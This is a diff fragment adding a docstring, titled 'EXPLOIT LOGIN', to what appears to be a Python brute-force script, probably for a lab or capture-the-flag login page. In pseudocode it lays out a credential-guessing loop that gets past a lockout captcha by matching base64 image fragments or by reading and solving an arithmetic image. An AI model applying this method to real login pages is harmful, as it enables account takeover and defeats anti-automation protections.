@@ -1,3 +1,40 @@
+"""
+EXPLOIT LOGIN 
+-------------
+
+
+
+- load usernames
+- load passwords
+
+- for each username:
+	for each password:
+		- make a GET request to `/login`
+		while {true}
+			check if `Detected 3 incorrect login attempts!` in response
+				- fetch <img src="data:image/png;base64,__IMG_BASE64__">
+				- if Dh4eHvKNzWywWf8f0eDzOu4f5LxrOwHAGhjMwnIHhDAxnYDgDwxkYzsBwBoYzMJyB4QwMZ2A4A8MZGM7AcAa in image
+					- make a POST request to `/login` captcha=square
+				- else if ksIZpR4atmypa6PoeoGGCBfvXpFKzxwQChwnQUwzjMqKspevSckRLfz1g0wgE6bNo1sOHBAOKPQBqjeU6lSJ in image
+					- make a POST request to `/login` captcha=triangle
+				- else if uabb7y15AEDBkjbkIjUV4GNNa9bt063atVKMv2tt94q6RJrVx01gRGWSKxevVrKG9zymDFj9IULFzyfsAAti in image
+					- make a POST request to `/login` captcha=circle
+				else
+					- convert the base64 image to text
+					- calculate the formula
+					- make a POST request to `/login` captcha=result
+			else
+				- break the loop
+
+		- make a POST request to `/login` username=user&password=pass
+		- check if response does not contain: `Invalid username or password`
+			- print username:password combination
+			- exit
+
+
+"""
+
+
 import requests
 
 def get_userpass(userlist, passlist):
